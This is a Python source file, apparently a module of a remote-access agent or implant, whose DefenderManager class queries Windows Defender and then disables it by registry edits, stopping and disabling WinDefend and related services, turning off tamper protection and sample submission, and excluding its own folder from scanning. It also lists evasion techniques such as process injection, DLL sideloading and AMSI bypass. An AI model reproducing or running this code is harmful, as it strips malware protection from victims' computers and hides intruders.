import winreg, ctypes, ctypes.wintypes, subprocess, os, sys, time, json
import win32service, win32serviceutil, win32security, win32con
import pythoncom, wmi

class DefenderManager:
    def __init__(self):
        self.defender_reg_path = r'SOFTWARE\Microsoft\Windows Defender'
        self.defender_policies_path = r'SOFTWARE\Policies\Microsoft\Windows Defender'
        self.mpcmdrun = r'C:\Program Files\Windows Defender\MpCmdRun.exe'
        
    def get_status(self):
        """Get Windows Defender status."""
        status = {
            'service': self.get_service_status(),
            'real_time': self.get_real_time_status(),
            'tamper_protection': self.get_tamper_protection(),
            'exclusions': self.get_exclusions(),
            'signature_version': self.get_signature_version(),
            'last_scan': self.get_last_scan(),
            'policies': self.get_policies()
        }
        
        return status
    
    def get_service_status(self):
        """Get Defender service status."""
        try:
            service_name = 'WinDefend'
            
            # Check via sc query
            result = subprocess.run(['sc', 'query', service_name], 
                                  capture_output=True, text=True, shell=True)
            
            output = result.stdout
            
            status = {}
            for line in output.split('\n'):
                line = line.strip()
                if 'STATE' in line:
                    status['state'] = line.split(':')[1].strip()
                elif 'TYPE' in line:
                    status['type'] = line.split(':')[1].strip()
            
            # Also check via WMI
            pythoncom.CoInitialize()
            try:
                wmi_conn = wmi.WMI()
                services = wmi_conn.Win32_Service(Name=service_name)
                if services:
                    service = services[0]
                    status['wmi_state'] = service.State
                    status['start_mode'] = service.StartMode
                    status['path'] = service.PathName
            except:
                pass
            pythoncom.CoUninitialize()
            
            return status
            
        except Exception as e:
            return {'error': str(e)}
    
    def get_real_time_status(self):
        """Get real-time protection status."""
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                self.defender_reg_path + r'\Real-Time Protection')
            
            disabled = winreg.QueryValueEx(key, 'DisableRealtimeMonitoring')[0]
            behavior = winreg.QueryValueEx(key, 'DisableBehaviorMonitoring')[0]
            ioav = winreg.QueryValueEx(key, 'DisableIOAVProtection')[0]
            
            winreg.CloseKey(key)
            
            return {
                'realtime_disabled': disabled == 1,
                'behavior_monitoring_disabled': behavior == 1,
                'ioav_protection_disabled': ioav == 1,
                'overall_enabled': not (disabled == 1)
            }
            
        except:
            return {'error': 'Registry key not found'}
    
    def get_tamper_protection(self):
        """Get tamper protection status."""
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                self.defender_reg_path + r'\Features')
            
            tamper_protection = winreg.QueryValueEx(key, 'TamperProtection')[0]
            
            winreg.CloseKey(key)
            
            return {
                'enabled': tamper_protection == 5,  # 5 = enabled
                'value': tamper_protection
            }
            
        except:
            return {'enabled': 'Unknown'}
    
    def get_exclusions(self):
        """Get Defender exclusions."""
        exclusions = {
            'processes': [],
            'paths': [],
            'extensions': []
        }
        
        try:
            # Process exclusions
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    self.defender_reg_path + r'\Exclusions\Processes')
                
                i = 0
                while True:
                    try:
                        value_name, value_data, _ = winreg.EnumValue(key, i)
                        exclusions['processes'].append(value_data)
                        i += 1
                    except OSError:
                        break
                
                winreg.CloseKey(key)
            except:
                pass
            
            # Path exclusions
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    self.defender_reg_path + r'\Exclusions\Paths')
                
                i = 0
                while True:
                    try:
                        value_name, value_data, _ = winreg.EnumValue(key, i)
                        exclusions['paths'].append(value_data)
                        i += 1
                    except OSError:
                        break
                
                winreg.CloseKey(key)
            except:
                pass
            
            # Extension exclusions
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    self.defender_reg_path + r'\Exclusions\Extensions')
                
                i = 0
                while True:
                    try:
                        value_name, value_data, _ = winreg.EnumValue(key, i)
                        exclusions['extensions'].append(value_data)
                        i += 1
                    except OSError:
                        break
                
                winreg.CloseKey(key)
            except:
                pass
            
        except Exception as e:
            exclusions['error'] = str(e)
        
        return exclusions
    
    def get_signature_version(self):
        """Get Defender signature version."""
        try:
            if os.path.exists(self.mpcmdrun):
                result = subprocess.run([self.mpcmdrun, '-GetFiles'], 
                                      capture_output=True, text=True, shell=True)
                
                output = result.stdout
                
                # Parse for signature version
                for line in output.split('\n'):
                    if 'Antivirus signature' in line:
                        return line.split(':')[1].strip()
            
            # Try registry
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                self.defender_reg_path + r'\Signature Updates')
            
            version = winreg.QueryValueEx(key, 'AVSignatureVersion')[0]
            
            winreg.CloseKey(key)
            
            return version
            
        except:
            return 'Unknown'
    
    def get_last_scan(self):
        """Get last scan information."""
        try:
            # Check event logs for last scan
            cmd = [
                'wevtutil', 'qe', 'Microsoft-Windows-Windows Defender/Operational',
                '/rd:true', '/c:1',
                '/q:"*[System[(EventID=1000 or EventID=1001 or EventID=1116 or EventID=1117)]]"',
                '/f:text'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            
            return result.stdout[:500]  # First 500 chars
            
        except:
            return 'Unknown'
    
    def get_policies(self):
        """Get Defender policies."""
        policies = {}
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, self.defender_policies_path)
            
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    
                    subkey_policies = {}
                    j = 0
                    while True:
                        try:
                            value_name, value_data, value_type = winreg.EnumValue(subkey, j)
                            subkey_policies[value_name] = {
                                'value': value_data,
                                'type': value_type
                            }
                            j += 1
                        except OSError:
                            break
                    
                    policies[subkey_name] = subkey_policies
                    winreg.CloseKey(subkey)
                    i += 1
                    
                except OSError:
                    break
            
            winreg.CloseKey(key)
            
        except:
            pass
        
        return policies
    
    def disable(self, method='registry'):
        """Disable Windows Defender."""
        methods = {
            'registry': self.disable_via_registry,
            'service': self.disable_via_service,
            'tamper': self.disable_tamper_protection,
            'group_policy': self.disable_via_group_policy
        }
        
        if method in methods:
            return methods[method]()
        else:
            return self.disable_all_methods()
    
    def disable_via_registry(self):
        """Disable Defender via registry modifications."""
        results = []
        
        try:
            # Disable real-time monitoring
            key_path = self.defender_reg_path + r'\Real-Time Protection'
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            winreg.SetValueEx(key, 'DisableRealtimeMonitoring', 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, 'DisableBehaviorMonitoring', 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, 'DisableIOAVProtection', 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, 'DisableScriptScanning', 0, winreg.REG_DWORD, 1)
            
            winreg.CloseKey(key)
            results.append("Real-time protection disabled via registry")
            
            # Disable SpyNet reporting
            key_path = self.defender_reg_path + r'\SpyNet'
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            winreg.SetValueEx(key, 'SpyNetReporting', 0, winreg.REG_DWORD, 0)  # 0 = disabled
            winreg.SetValueEx(key, 'SubmitSamplesConsent', 0, winreg.REG_DWORD, 2)  # 2 = never send
            
            winreg.CloseKey(key)
            results.append("SpyNet reporting disabled")
            
            # Disable scanning
            key_path = self.defender_reg_path
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            winreg.SetValueEx(key, 'DisableAntiSpyware', 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, 'DisableAntiVirus', 0, winreg.REG_DWORD, 1)
            
            winreg.CloseKey(key)
            results.append("Anti-spyware and anti-virus disabled")
            
            # Add exclusions for our paths
            self.add_exclusion(os.path.dirname(sys.executable if hasattr(sys, 'frozen') else sys.argv[0]))
            results.append("Exclusion added for agent path")
            
            return results
            
        except Exception as e:
            return [f"Registry modification failed: {e}"]
    
    def disable_via_service(self):
        """Disable Defender service."""
        results = []
        
        try:
            service_name = 'WinDefend'
            
            # Stop service
            subprocess.run(['sc', 'stop', service_name], capture_output=True, shell=True)
            results.append(f"Service {service_name} stopped")
            
            # Disable service
            subprocess.run(['sc', 'config', service_name, 'start=', 'disabled'], 
                         capture_output=True, shell=True)
            results.append(f"Service {service_name} disabled")
            
            # Also disable related services
            related_services = ['WdNisSvc', 'Sense', 'WdBoot', 'WdFilter']
            
            for svc in related_services:
                try:
                    subprocess.run(['sc', 'stop', svc], capture_output=True, shell=True)
                    subprocess.run(['sc', 'config', svc, 'start=', 'disabled'], 
                                 capture_output=True, shell=True)
                    results.append(f"Related service {svc} stopped and disabled")
                except:
                    pass
            
            return results
            
        except Exception as e:
            return [f"Service manipulation failed: {e}"]
    
    def disable_tamper_protection(self):
        """Disable tamper protection."""
        try:
            # Tamper protection is tricky - requires Group Policy or registry before Windows 10 1903
            key_path = self.defender_reg_path + r'\Features'
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            winreg.SetValueEx(key, 'TamperProtection', 0, winreg.REG_DWORD, 0)  # 0 = disabled
            
            winreg.CloseKey(key)
            
            return ["Tamper protection disabled via registry (may require reboot)"]
            
        except Exception as e:
            return [f"Tamper protection disable failed: {e}"]
    
    def disable_via_group_policy(self):
        """Disable Defender via Group Policy settings."""
        # This modifies the policies registry keys
        try:
            key_path = self.defender_policies_path + r'\Real-Time Protection'
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            winreg.SetValueEx(key, 'DisableRealtimeMonitoring', 0, winreg.REG_DWORD, 1)
            
            winreg.CloseKey(key)
            
            # Disable via policy
            policy_path = self.defender_policies_path
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, policy_path)
            
            winreg.SetValueEx(key, 'DisableAntiSpyware', 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, 'ServiceKeepAlive', 0, winreg.REG_DWORD, 0)
            
            winreg.CloseKey(key)
            
            return ["Group Policy settings applied (may require gpupdate /force)"]
            
        except Exception as e:
            return [f"Group Policy modification failed: {e}"]
    
    def disable_all_methods(self):
        """Try all disable methods."""
        all_results = []
        
        methods = ['registry', 'service', 'tamper', 'group_policy']
        
        for method in methods:
            try:
                results = self.disable(method)
                all_results.extend(results)
            except:
                all_results.append(f"Method {method} failed")
        
        return all_results
    
    def enable(self):
        """Enable Windows Defender."""
        try:
            # Re-enable registry settings
            key_path = self.defender_reg_path + r'\Real-Time Protection'
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            winreg.SetValueEx(key, 'DisableRealtimeMonitoring', 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, 'DisableBehaviorMonitoring', 0, winreg.REG_DWORD, 0)
            
            winreg.CloseKey(key)
            
            # Re-enable service
            service_name = 'WinDefend'
            subprocess.run(['sc', 'config', service_name, 'start=', 'auto'], 
                         capture_output=True, shell=True)
            subprocess.run(['sc', 'start', service_name], capture_output=True, shell=True)
            
            return "Windows Defender enabled"
            
        except Exception as e:
            return f"Enable failed: {e}"
    
    def bypass_realtime(self):
        """Bypass real-time protection without disabling."""
        techniques = []
        
        # Technique 1: Use LOLBAS (Living Off The Land Binaries)
        techniques.append("Use signed Microsoft binaries for execution")
        
        # Technique 2: Process hollowing/injection
        techniques.append("Inject into trusted processes")
        
        # Technique 3: DLL sideloading
        techniques.append("DLL sideloading with signed binaries")
        
        # Technique 4: AMSI bypass (already covered separately)
        techniques.append("AMSI bypass for PowerShell/.NET")
        
        # Technique 5: Use Windows tools for download
        techniques.append("Use bitsadmin, certutil, or msiexec for downloads")
        
        # Technique 6: Obfuscation
        techniques.append("Heavy obfuscation and polymorphism")
        
        return techniques
    
    def add_exclusion(self, path):
        """Add exclusion for path in Windows Defender."""
        try:
            # Convert to absolute path
            path = os.path.abspath(path)
            
            # Add to registry
            key_path = self.defender_reg_path + r'\Exclusions\Paths'
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            # Create unique value name
            value_name = hashlib.md5(path.encode()).hexdigest()[:8]
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, path)
            
            winreg.CloseKey(key)
            
            # Also try via PowerShell if available
            try:
                ps_cmd = f'Add-MpPreference -ExclusionPath "{path}"'
                subprocess.run(['powershell', '-Command', ps_cmd], 
                             capture_output=True, shell=True)
            except:
                pass
            
            return f"Exclusion added for: {path}"
            
        except Exception as e:
            return f"Failed to add exclusion: {e}"
    
    def remove_exclusion(self, path):
        """Remove exclusion for path."""
        try:
            path = os.path.abspath(path)
            
            # Remove from registry
            key_path = self.defender_reg_path + r'\Exclusions\Paths'
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 
                               0, winreg.KEY_ALL_ACCESS)
            
            # Find and delete the value
            i = 0
            to_delete = []
            while True:
                try:
                    value_name, value_data, _ = winreg.EnumValue(key, i)
                    if value_data == path:
                        to_delete.append(value_name)
                    i += 1
                except OSError:
                    break
            
            for value_name in to_delete:
                winreg.DeleteValue(key, value_name)
            
            winreg.CloseKey(key)
            
            return f"Exclusion removed for: {path}"
            
        except Exception as e:
            return f"Failed to remove exclusion: {e}"
    
    def force_scan(self, path=None):
        """Force a Defender scan."""
        try:
            if os.path.exists(self.mpcmdrun):
                if path:
                    cmd = [self.mpcmdrun, '-Scan', '-ScanType', '3', '-File', f'"{path}"', '-DisableRemediation']
                else:
                    cmd = [self.mpcmdrun, '-Scan', '-ScanType', '1', '-DisableRemediation']
                
                result = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=300)
                
                return {
                    'success': result.returncode == 0,
                    'output': result.stdout[:1000]
                }
            else:
                return {'error': 'MpCmdRun.exe not found'}
                
        except subprocess.TimeoutExpired:
            return {'error': 'Scan timeout'}
        except Exception as e:
            return {'error': str(e)}
    
    def update_signatures(self):
        """Update Defender signatures."""
        try:
            if os.path.exists(self.mpcmdrun):
                result = subprocess.run([self.mpcmdrun, '-SignatureUpdate'], 
                                      capture_output=True, text=True, shell=True, timeout=300)
                
                return {
                    'success': result.returncode == 0,
                    'output': result.stdout[:500]
                }
            else:
                return {'error': 'MpCmdRun.exe not found'}
                
        except subprocess.TimeoutExpired:
            return {'error': 'Update timeout'}
        except Exception as e:
            return {'error': str(e)}